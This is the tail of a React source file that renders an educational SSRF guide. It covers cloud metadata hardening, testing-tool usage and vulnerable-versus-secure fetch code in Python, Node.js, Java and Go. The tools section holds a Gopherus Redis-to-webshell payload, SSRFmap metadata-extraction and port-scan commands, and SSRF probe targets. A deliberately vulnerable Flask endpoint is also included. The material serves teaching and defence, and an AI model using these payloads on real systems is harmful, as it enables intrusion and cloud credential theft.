                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Block Metadata Endpoints" 
                    secondary="Use iptables/firewall rules to block 169.254.169.254 from application servers."
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Egress Filtering" 
                    secondary="Control which external hosts your servers can reach. Use proxy servers for outbound requests."
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Use IMDSv2 on AWS" 
                    secondary="Requires session tokens for metadata access, making SSRF exploitation significantly harder."
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Zero Trust Architecture" 
                    secondary="Assume breach; require authentication for all internal service communication."
                  />
                </ListItem>
              </List>

              <CodeBlock title="AWS: Enforce IMDSv2">{`# Enforce IMDSv2 via AWS CLI
aws ec2 modify-instance-metadata-options \\
  --instance-id i-1234567890abcdef0 \\
  --http-tokens required \\
  --http-endpoint enabled

# Terraform
resource "aws_instance" "example" {
  metadata_options {
    http_tokens   = "required"
    http_endpoint = "enabled"
  }
}`}</CodeBlock>

              <CodeBlock title="Block Metadata with iptables">{`# Block access to metadata service
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# Block link-local range
iptables -A OUTPUT -d 169.254.0.0/16 -j DROP

# Allow only specific users (e.g., root for legitimate use)
iptables -A OUTPUT -m owner --uid-owner root -d 169.254.169.254 -j ACCEPT
iptables -A OUTPUT -d 169.254.169.254 -j DROP`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Cloud Provider Hardening</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="subtitle2" fontWeight="bold" gutterBottom>AWS</Typography>
              <List dense>
                <ListItem><ListItemText primary="Enable IMDSv2 and disable IMDSv1" /></ListItem>
                <ListItem><ListItemText primary="Use VPC endpoints for AWS services" /></ListItem>
                <ListItem><ListItemText primary="Restrict IAM roles to minimum permissions" /></ListItem>
                <ListItem><ListItemText primary="Use AWS WAF to block SSRF patterns" /></ListItem>
              </List>
              
              <Typography variant="subtitle2" fontWeight="bold" gutterBottom sx={{ mt: 2 }}>GCP</Typography>
              <List dense>
                <ListItem><ListItemText primary="Use Workload Identity instead of service account keys" /></ListItem>
                <ListItem><ListItemText primary="Restrict service account permissions" /></ListItem>
                <ListItem><ListItemText primary="Enable VPC Service Controls" /></ListItem>
              </List>

              <Typography variant="subtitle2" fontWeight="bold" gutterBottom sx={{ mt: 2 }}>Azure</Typography>
              <List dense>
                <ListItem><ListItemText primary="Use Managed Identities with minimum permissions" /></ListItem>
                <ListItem><ListItemText primary="Configure Network Security Groups" /></ListItem>
                <ListItem><ListItemText primary="Enable Azure Firewall for egress filtering" /></ListItem>
              </List>
            </AccordionDetails>
          </Accordion>
        </Paper>
      </Box>

      {/* Section: Tools */}
      <Box id="tools" sx={{ mb: 4, scrollMarginTop: "80px" }}>
        <Paper
          sx={{
            p: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#06b6d4", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <BuildIcon sx={{ color: "#06b6d4" }} />
            SSRF Testing Tools
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {ssrfTools.map((tool) => (
              <Grid item xs={12} sm={6} md={4} key={tool.name}>
                <Card
                  sx={{
                    height: "100%",
                    bgcolor: alpha("#06b6d4", 0.08),
                    border: `1px solid ${alpha("#06b6d4", 0.2)}`,
                    borderRadius: 2,
                  }}
                >
                  <CardContent>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                      <Typography variant="h6" fontWeight="bold" sx={{ color: "#e0e0e0" }}>{tool.name}</Typography>
                      <Chip label={tool.type} size="small" sx={{ bgcolor: alpha("#06b6d4", 0.2), color: "#06b6d4" }} />
                    </Box>
                    <Typography variant="body2" sx={{ color: "grey.400" }}>{tool.desc}</Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">SSRFmap Usage</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="SSRFmap Examples">{`# Install SSRFmap
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip install -r requirements.txt

# Basic scan
python ssrfmap.py -r request.txt -p url -m readfiles

# Request file format (request.txt):
GET /fetch?url=XXXX HTTP/1.1
Host: vulnerable-site.com
Cookie: session=abc123

# Available modules:
# - readfiles: Read local files via file://
# - portscan: Scan internal ports
# - networkscan: Scan internal network
# - aws: Extract AWS metadata
# - gce: Extract GCP metadata
# - alibaba: Extract Alibaba Cloud metadata

# AWS metadata extraction
python ssrfmap.py -r request.txt -p url -m aws

# Internal port scan
python ssrfmap.py -r request.txt -p url -m portscan`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Gopherus - Gopher Payload Generator</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Gopherus Usage">{`# Install Gopherus
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
chmod +x gopherus.py

# Generate Redis payload
python gopherus.py --exploit redis

# Generate MySQL payload
python gopherus.py --exploit mysql

# Generate FastCGI payload (PHP-FPM)
python gopherus.py --exploit fastcgi

# Generate Memcached payload
python gopherus.py --exploit phpmemcache

# Example: Redis RCE via webshell
# Gopherus will prompt for:
# - PHP file location: /var/www/html/shell.php
# - PHP code: <?php system($_GET['cmd']); ?>`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Nuclei SSRF Templates</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Using Nuclei for SSRF Detection">{`# Install nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Run SSRF templates
nuclei -u https://target.com -tags ssrf

# Run with interactsh for OOB detection
nuclei -u https://target.com -tags ssrf -iserver https://interact.sh

# Custom SSRF template
id: custom-ssrf-test
info:
  name: Custom SSRF Test
  severity: high
  tags: ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/fetch?url={{interactsh-url}}"
      - "{{BaseURL}}/proxy?target={{interactsh-url}}"
      - "{{BaseURL}}/api/webhook?callback={{interactsh-url}}"
    
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Burp Suite SSRF Testing</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Burp Collaborator SSRF Testing">{`# Using Burp Collaborator for blind SSRF

1. Open Burp Suite Professional
2. Go to Burp > Collaborator client
3. Click "Copy to clipboard" to get your Collaborator URL

4. Insert Collaborator URL in potential SSRF parameters:
   - url=http://YOUR-ID.burpcollaborator.net
   - callback=http://YOUR-ID.burpcollaborator.net
   - redirect=http://YOUR-ID.burpcollaborator.net

5. Check Collaborator client for interactions:
   - HTTP requests (indicates SSRF)
   - DNS lookups (indicates partial SSRF)

# Useful Burp extensions for SSRF:
- Collaborator Everywhere: Auto-inject Collaborator URLs
- Param Miner: Discover hidden parameters
- Logger++: Enhanced logging for analysis

# Intruder payloads for SSRF testing:
127.0.0.1
localhost
0.0.0.0
[::1]
169.254.169.254
metadata.google.internal`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </Paper>
      </Box>

      {/* Section: Code Examples */}
      <Box id="code-examples" sx={{ mb: 4, scrollMarginTop: "80px" }}>
        <Paper
          sx={{
            p: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#ec4899", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <CodeIcon sx={{ color: "#ec4899" }} />
            Code Examples
          </Typography>

          <Alert severity="info" sx={{ mb: 3, bgcolor: alpha("#3b82f6", 0.1), border: `1px solid ${alpha("#3b82f6", 0.3)}` }}>
            <Typography sx={{ color: "grey.300" }}>
              Compare vulnerable implementations with their secure counterparts across multiple languages.
            </Typography>
          </Alert>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Vulnerable Code (Python)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="vulnerable_ssrf.py">{`# VULNERABLE - Do not use in production!
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # No validation! Attacker can specify any URL
    response = requests.get(url)
    return response.text

@app.route('/webhook')
def webhook():
    callback_url = request.json.get('callback')
    # Blindly making requests to user-supplied URLs
    requests.post(callback_url, json={'status': 'complete'})
    return {'status': 'sent'}

@app.route('/preview')
def preview():
    url = request.args.get('url')
    # Even checking the scheme is not enough!
    if url.startswith('http'):
        return requests.get(url).text
    return 'Invalid URL'`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Secure Code (Python)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="secure_ssrf.py">{`import requests
import ipaddress
from urllib.parse import urlparse
import socket
from flask import Flask, request, abort
import logging

app = Flask(__name__)
logger = logging.getLogger(__name__)

# Strict allowlist of permitted domains
ALLOWED_DOMAINS = {'api.example.com', 'cdn.example.com', 'trusted-partner.com'}

# IP ranges that should NEVER be accessed
BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),      # Localhost
    ipaddress.ip_network('10.0.0.0/8'),       # Private
    ipaddress.ip_network('172.16.0.0/12'),    # Private
    ipaddress.ip_network('192.168.0.0/16'),   # Private
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local (metadata!)
    ipaddress.ip_network('::1/128'),          # IPv6 localhost
    ipaddress.ip_network('fc00::/7'),         # IPv6 private
    ipaddress.ip_network('fe80::/10'),        # IPv6 link-local
]

# Only allow these schemes
ALLOWED_SCHEMES = {'http', 'https'}

def is_ip_blocked(ip_str: str) -> bool:
    """Check if an IP address is in a blocked range."""
    try:
        ip = ipaddress.ip_address(ip_str)
        for blocked in BLOCKED_RANGES:
            if ip in blocked:
                return True
        return False
    except ValueError:
        return True  # Invalid IP = blocked

def resolve_and_validate(hostname: str) -> str | None:
    """Resolve hostname and validate the IP is safe."""
    try:
        # Get all IP addresses for the hostname
        _, _, ip_list = socket.gethostbyname_ex(hostname)
        
        # Check ALL resolved IPs
        for ip in ip_list:
            if is_ip_blocked(ip):
                logger.warning(f"Blocked IP {ip} for hostname {hostname}")
                return None
        
        return ip_list[0]  # Return first safe IP
    except socket.gaierror:
        return None

def is_safe_url(url: str) -> tuple[bool, str]:
    """Validate URL is safe to fetch."""
    try:
        parsed = urlparse(url)
        
        # Check scheme
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False, f"Blocked scheme: {parsed.scheme}"
        
        # Check for empty hostname
        if not parsed.hostname:
            return False, "No hostname provided"
        
        # Check domain allowlist
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False, f"Domain not in allowlist: {parsed.hostname}"
        
        # Resolve DNS and validate IP
        resolved_ip = resolve_and_validate(parsed.hostname)
        if not resolved_ip:
            return False, "Hostname resolves to blocked IP"
        
        # Additional: Check for suspicious port
        if parsed.port and parsed.port not in (80, 443):
            return False, f"Non-standard port: {parsed.port}"
        
        return True, "OK"
        
    except Exception as e:
        logger.error(f"URL validation error: {e}")
        return False, str(e)

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url', '')
    
    # Validate the URL
    is_safe, reason = is_safe_url(url)
    if not is_safe:
        logger.warning(f"Blocked SSRF attempt: {url} - {reason}")
        abort(400, f'Invalid URL: {reason}')
    
    try:
        response = requests.get(
            url,
            allow_redirects=False,  # Don't follow redirects!
            timeout=5,              # Prevent hanging
            headers={'User-Agent': 'SafeFetcher/1.0'}
        )
        
        # Don't return internal error details
        if response.status_code >= 400:
            return {'error': 'Failed to fetch resource'}, 502
        
        return response.text
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed: {e}")
        return {'error': 'Request failed'}, 502`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Secure Code (Node.js)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="secure_ssrf.js">{`const express = require('express');
const axios = require('axios');
const dns = require('dns').promises;
const { URL } = require('url');
const ipaddr = require('ipaddr.js');

const app = express();

const ALLOWED_DOMAINS = new Set(['api.example.com', 'cdn.example.com']);
const ALLOWED_SCHEMES = new Set(['http:', 'https:']);

// Check if IP is in private/blocked range
function isBlockedIP(ip) {
  try {
    const parsed = ipaddr.parse(ip);
    const range = parsed.range();
    
    // Block all non-unicast addresses
    const blockedRanges = [
      'loopback',
      'private',
      'linkLocal',
      'uniqueLocal',
      'unspecified',
      'reserved'
    ];
    
    return blockedRanges.includes(range);
  } catch {
    return true; // Invalid IP = blocked
  }
}

async function isSafeUrl(urlString) {
  try {
    const url = new URL(urlString);
    
    // Check scheme
    if (!ALLOWED_SCHEMES.has(url.protocol)) {
      return { safe: false, reason: 'Invalid scheme' };
    }
    
    // Check domain allowlist
    if (!ALLOWED_DOMAINS.has(url.hostname)) {
      return { safe: false, reason: 'Domain not allowed' };
    }
    
    // Resolve DNS and check all IPs
    const addresses = await dns.resolve4(url.hostname);
    for (const addr of addresses) {
      if (isBlockedIP(addr)) {
        return { safe: false, reason: 'Resolves to blocked IP' };
      }
    }
    
    return { safe: true };
  } catch (error) {
    return { safe: false, reason: error.message };
  }
}

app.get('/fetch', async (req, res) => {
  const url = req.query.url;
  
  if (!url) {
    return res.status(400).json({ error: 'URL required' });
  }
  
  const validation = await isSafeUrl(url);
  if (!validation.safe) {
    console.warn(\`Blocked SSRF: \${url} - \${validation.reason}\`);
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  try {
    const response = await axios.get(url, {
      maxRedirects: 0,      // Don't follow redirects
      timeout: 5000,        // 5 second timeout
      validateStatus: (status) => status < 400
    });
    
    res.send(response.data);
  } catch (error) {
    console.error(\`Fetch error: \${error.message}\`);
    res.status(502).json({ error: 'Failed to fetch' });
  }
});

app.listen(3000);`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Secure Code (Java)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="SecureUrlFetcher.java">{`import java.net.*;
import java.io.*;
import java.util.*;

public class SecureUrlFetcher {
    
    private static final Set<String> ALLOWED_DOMAINS = Set.of(
        "api.example.com", "cdn.example.com"
    );
    
    private static final List<String> BLOCKED_PREFIXES = List.of(
        "127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.",
        "172.19.", "172.20.", "172.21.", "172.22.", "172.23.",
        "172.24.", "172.25.", "172.26.", "172.27.", "172.28.",
        "172.29.", "172.30.", "172.31.", "169.254.", "0."
    );
    
    public static boolean isBlockedIP(String ip) {
        for (String prefix : BLOCKED_PREFIXES) {
            if (ip.startsWith(prefix)) {
                return true;
            }
        }
        // Check IPv6 loopback
        return ip.equals("::1") || ip.startsWith("fe80:");
    }
    
    public static String safeFetch(String urlString) throws Exception {
        URL url = new URL(urlString);
        
        // Check scheme
        if (!url.getProtocol().equals("http") && 
            !url.getProtocol().equals("https")) {
            throw new SecurityException("Invalid URL scheme");
        }
        
        // Check domain allowlist
        if (!ALLOWED_DOMAINS.contains(url.getHost())) {
            throw new SecurityException("Domain not allowed");
        }
        
        // Resolve and check IP
        InetAddress[] addresses = InetAddress.getAllByName(url.getHost());
        for (InetAddress addr : addresses) {
            if (isBlockedIP(addr.getHostAddress()) || 
                addr.isLoopbackAddress() ||
                addr.isSiteLocalAddress() ||
                addr.isLinkLocalAddress()) {
                throw new SecurityException("Blocked IP address");
            }
        }
        
        // Make request with restrictions
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setInstanceFollowRedirects(false);  // No redirects
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()))) {
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            return response.toString();
        }
    }
}`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Secure Code (Go)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="secure_ssrf.go">{`package main

import (
    "context"
    "fmt"
    "io"
    "net"
    "net/http"
    "net/url"
    "time"
)

var allowedDomains = map[string]bool{
    "api.example.com": true,
    "cdn.example.com": true,
}

func isBlockedIP(ip net.IP) bool {
    // Check for private, loopback, link-local
    return ip.IsLoopback() ||
           ip.IsPrivate() ||
           ip.IsLinkLocalUnicast() ||
           ip.IsLinkLocalMulticast() ||
           ip.IsUnspecified()
}

func safeDialer(ctx context.Context, network, addr string) (net.Conn, error) {
    host, port, err := net.SplitHostPort(addr)
    if err != nil {
        return nil, err
    }
    
    // Resolve and check IPs
    ips, err := net.LookupIP(host)
    if err != nil {
        return nil, err
    }
    
    for _, ip := range ips {
        if isBlockedIP(ip) {
            return nil, fmt.Errorf("blocked IP: %s", ip)
        }
    }
    
    // Connect to first safe IP
    dialer := &net.Dialer{Timeout: 5 * time.Second}
    return dialer.DialContext(ctx, network, net.JoinHostPort(ips[0].String(), port))
}

func safeFetch(urlStr string) (string, error) {
    parsed, err := url.Parse(urlStr)
    if err != nil {
        return "", err
    }
    
    // Check scheme
    if parsed.Scheme != "http" && parsed.Scheme != "https" {
        return "", fmt.Errorf("invalid scheme: %s", parsed.Scheme)
    }
    
    // Check domain
    if !allowedDomains[parsed.Host] {
        return "", fmt.Errorf("domain not allowed: %s", parsed.Host)
    }
    
    // Create client with safe dialer
    client := &http.Client{
        Timeout: 10 * time.Second,
        Transport: &http.Transport{
            DialContext: safeDialer,
        },
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse // Don't follow redirects
        },
    }
    
    resp, err := client.Get(urlStr)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()
    
    body, err := io.ReadAll(resp.Body)
    return string(body), err
}`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </Paper>
      </Box>

      {/* Quiz Section */}
      <Box id="quiz" sx={{ mb: 4, scrollMarginTop: "80px" }}>
        <QuizSection
          questions={quizPool}
          accentColor={ACCENT_COLOR}
          title="SSRF Knowledge Check"
          description="Random 10-question quiz drawn from a 75-question bank each time the page loads."
          questionsPerQuiz={QUIZ_QUESTION_COUNT}
        />
      </Box>

      {/* Related Learning Pages */}
      <Paper
        sx={{
          p: 4,
          mb: 4,
          borderRadius: 3,
          bgcolor: "#0f1024",
          border: `1px solid ${alpha(ACCENT_COLOR, 0.3)}`,
        }}
      >
        <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <SchoolIcon sx={{ color: ACCENT_COLOR }} />
          Related Learning Pages
        </Typography>
        <Grid container spacing={2}>
          {[
            { title: "Web App Pentesting Guide", desc: "Comprehensive methodology for security assessments", link: "/learn/pentesting-guide", color: "#ef4444" },
            { title: "XXE Injection", desc: "XML External Entity attacks and prevention", link: "/learn/xxe", color: "#f59e0b" },
            { title: "Cloud Security", desc: "AWS, GCP, and Azure security best practices", link: "/learn/cloud-security", color: "#22c55e" },
          ].map((item) => (
            <Grid item xs={12} sm={4} key={item.title}>
              <Card
                component={Link}
                to={item.link}
                sx={{
                  height: "100%",
                  bgcolor: alpha(item.color, 0.1),
                  border: `1px solid ${alpha(item.color, 0.3)}`,
                  borderRadius: 2,
                  textDecoration: "none",
                  transition: "transform 0.2s, box-shadow 0.2s",
                  "&:hover": {
                    transform: "translateY(-2px)",
                    boxShadow: `0 4px 12px ${alpha(item.color, 0.3)}`,
                  },
                }}
              >
                <CardContent>
                  <Typography variant="subtitle1" fontWeight="bold" sx={{ color: item.color, mb: 1 }}>
                    {item.title}
                  </Typography>
                  <Typography variant="body2" sx={{ color: "grey.400" }}>
                    {item.desc}
                  </Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      </Paper>

      {/* Bottom Navigation */}
      <Box sx={{ mt: 4, textAlign: "center" }}>
        <Button
          variant="outlined"
          startIcon={<ArrowBackIcon />}
          onClick={() => navigate("/learn")}
          sx={{ borderColor: ACCENT_COLOR, color: ACCENT_COLOR }}
        >
          Back to Learning Hub
        </Button>
      </Box>
          </Grid>
        </Grid>
      </Container>
    </Box>

    {/* Mobile Drawer */}
    <Drawer
      anchor="left"
      open={navDrawerOpen}
      onClose={() => setNavDrawerOpen(false)}
      sx={{
        display: { xs: "block", md: "none" },
        "& .MuiDrawer-paper": { width: 280, bgcolor: "#12121a" },
      }}
    >
      <Box sx={{ p: 2 }}>
        <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
          <Typography variant="h6" sx={{ color: ACCENT_COLOR, fontWeight: 700 }}>
            SSRF Guide
          </Typography>
          <IconButton onClick={() => setNavDrawerOpen(false)} sx={{ color: "grey.400" }}>
            <CloseIcon />
          </IconButton>
        </Box>
        {sidebarNav}
      </Box>
    </Drawer>

    {/* Mobile FABs */}
    {isMobile && (
      <>
        <Fab
          size="small"
          onClick={() => setNavDrawerOpen(true)}
          sx={{
            position: "fixed",
            bottom: 80,
            right: 16,
            bgcolor: ACCENT_COLOR,
            color: "white",
            "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.8) },
          }}
        >
          <ListAltIcon />
        </Fab>
        <Fab
          size="small"
          onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
          sx={{
            position: "fixed",
            bottom: 16,
            right: 16,
            bgcolor: alpha(ACCENT_COLOR, 0.8),
            color: "white",
            "&:hover": { bgcolor: ACCENT_COLOR },
          }}
        >
          <KeyboardArrowUpIcon />
        </Fab>
      </>
    )}
    </LearnPageLayout>
  );
};

export default SSRFGuidePage;
